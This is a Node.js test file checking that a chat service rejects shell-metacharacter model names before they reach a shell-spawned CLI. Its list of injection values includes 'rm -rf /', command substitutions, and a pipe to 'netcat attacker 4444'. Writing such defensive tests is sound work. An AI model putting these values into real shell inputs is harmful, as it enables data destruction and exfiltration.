'use strict';

// Regression coverage for the OS command-injection guard on user-supplied
// model overrides. User input (primaryModel / fallbackModel from POST /api/chat,
// model from POST /api/image-parser/parse) ultimately reaches
// spawn('claude'|'codex', ['--model', model], { shell: true }). With shell:true
// the OS shell re-parses the argument, so a model string containing shell
// metacharacters (e.g. `sonnet & calc`, backticks) is a command-injection
// vector. These tests assert such strings are rejected with INVALID_MODEL and
// never reach a spawn, while legitimate model ids still pass.

const test = require('node:test');
const assert = require('node:assert/strict');

const {
  isModelAllowed,
  assertModelAllowed,
  resolvePolicy,
} = require('../src/services/chat-orchestrator');
const claude = require('../src/services/claude');
const codex = require('../src/services/codex');

const MALICIOUS_MODELS = [
  'sonnet & calc',
  'claude-opus-4-8 && calc.exe',
  'gpt-5.5; rm -rf /',
  'model`whoami`',
  'model$(whoami)',
  'model | netcat attacker 4444',
  'model\nrm -rf /',
  'model"with"quotes',
  "model'with'quotes",
  'model with spaces',
  'model>output',
  'model<input',
];

const LEGITIMATE_MODELS = [
  'claude-opus-4-8',          // catalog id
  'claude-sonnet-4-20250514', // catalog id
  'gpt-5.5',                  // catalog id
  'gpt-5.4-mini',             // catalog id
  'gemini-3-flash-preview',   // catalog id
  'claude-custom-model',      // ad-hoc but safe-character (must keep working)
  'codex-custom-model',       // ad-hoc but safe-character
  'org/model:tag',            // namespaced model id form
];

test('model injection guard', async (t) => {
  await t.test('isModelAllowed accepts empty/undefined (happy path, falls back to default)', () => {
    assert.equal(isModelAllowed(''), true);
    assert.equal(isModelAllowed(undefined), true);
    assert.equal(isModelAllowed(null), true);
    assert.equal(isModelAllowed('   '), true); // trims to empty
  });

  await t.test('isModelAllowed accepts legitimate catalog and safe-character model ids', () => {
    for (const model of LEGITIMATE_MODELS) {
      assert.equal(isModelAllowed(model), true, `expected ${JSON.stringify(model)} to be allowed`);
    }
  });

  await t.test('isModelAllowed rejects every malicious model string', () => {
    for (const model of MALICIOUS_MODELS) {
      assert.equal(isModelAllowed(model), false, `expected ${JSON.stringify(model)} to be rejected`);
    }
  });

  await t.test('isModelAllowed rejects an over-length model string', () => {
    assert.equal(isModelAllowed('a'.repeat(201)), false);
    assert.equal(isModelAllowed('a'.repeat(200)), true);
  });

  await t.test('assertModelAllowed throws INVALID_MODEL for malicious input', () => {
    for (const model of MALICIOUS_MODELS) {
      assert.throws(
        () => assertModelAllowed(model, 'primaryModel'),
        (err) => {
          assert.equal(err.code, 'INVALID_MODEL');
          return true;
        },
        `expected assertModelAllowed to throw for ${JSON.stringify(model)}`
      );
    }
  });

  await t.test('assertModelAllowed does not throw for legitimate input', () => {
    for (const model of LEGITIMATE_MODELS) {
      assert.doesNotThrow(() => assertModelAllowed(model));
    }
    assert.doesNotThrow(() => assertModelAllowed(''));
  });

  await t.test('resolvePolicy rejects a malicious primaryModel with INVALID_MODEL', () => {
    assert.throws(
      () => resolvePolicy({
        mode: 'single',
        primaryProvider: 'claude',
        primaryModel: 'sonnet & calc',
      }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });

  await t.test('resolvePolicy rejects a malicious fallbackModel with INVALID_MODEL', () => {
    assert.throws(
      () => resolvePolicy({
        mode: 'fallback',
        primaryProvider: 'claude',
        fallbackProvider: 'gpt-5.5',
        fallbackModel: 'model`whoami`',
      }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });

  await t.test('resolvePolicy accepts legitimate primary/fallback model overrides', () => {
    const policy = resolvePolicy({
      mode: 'fallback',
      primaryProvider: 'claude',
      primaryModel: 'claude-custom-model',
      fallbackProvider: 'gpt-5.5',
      fallbackModel: 'codex-custom-model',
    });
    assert.equal(policy.primaryModel, 'claude-custom-model');
    assert.equal(policy.fallbackModel, 'codex-custom-model');
  });

  // The true chokepoint: the spawn wrappers themselves must refuse a malicious
  // model BEFORE spawning. We assert the call throws synchronously with
  // INVALID_MODEL; because it throws before building args / spawning, no child
  // process is ever created. (HARNESS_PROVIDERS_STUBBED is intentionally unset
  // so we exercise the real guard, not a stub — the guard runs first.)
  await t.test('claude.chat refuses a malicious model before spawning', () => {
    assert.throws(
      () => claude.chat({
        messages: [{ role: 'user', content: 'hi' }],
        model: 'sonnet & calc',
        onChunk: () => {},
        onDone: () => {},
        onError: () => {},
      }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });

  await t.test('codex.chat refuses a malicious model before spawning', () => {
    assert.throws(
      () => codex.chat({
        messages: [{ role: 'user', content: 'hi' }],
        model: 'gpt-5.5; rm -rf /',
        onChunk: () => {},
        onDone: () => {},
        onError: () => {},
      }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });

  await t.test('claude.parseEscalation refuses a malicious model before spawning', async () => {
    await assert.rejects(
      () => claude.parseEscalation('some escalation text', { model: 'model$(whoami)' }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });

  await t.test('codex.parseEscalation refuses a malicious model before spawning', async () => {
    await assert.rejects(
      () => codex.parseEscalation('some escalation text', { model: 'model`id`' }),
      (err) => {
        assert.equal(err.code, 'INVALID_MODEL');
        return true;
      }
    );
  });
});
